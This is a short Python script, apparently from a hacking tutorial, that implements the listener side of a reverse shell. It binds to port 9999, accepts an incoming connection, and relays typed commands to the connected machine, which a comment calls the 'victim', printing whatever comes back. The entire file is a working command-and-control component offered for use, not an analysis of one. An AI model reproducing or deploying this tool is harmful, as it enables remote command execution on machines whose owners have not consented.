import socket
import sys
#create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port=9999 #uncommon port
        s=socket.socket()
    except socket.error as msg:
        print("Socket creation error "+str(msg))

#Binding the socket and listning
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port "+str(port))
        s.bind((host,port))
        s.listen(5) #num of connections it listens
    except socket.error as msg:
        print("Socket biding error "+str(msg)+"\n"+" Rebinding....")
        bind_socket()

#Establish connection with a client and the listning must continues
def socket_accept():
    conn,adderss=s.accept()
    print("Connection been established |"+" IP "+adderss[0]+" | port "+str(adderss[1]))#1st connect then print
    send_commands(conn)
    conn.close()

#Send command to victim
def send_commands(conn):
    while True:
        cmd=input() #from command prompt
        if cmd=='quit':
            conn.close()
            s.close()
            sys.exit() #exit command prompt
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response=str(conn.recv(1024),"utf-8") #chunck size 1024 buffer size
            print(client_response,end="") #cursor to next line after enter
def main():
    create_socket()
    bind_socket()
    socket_accept()

main()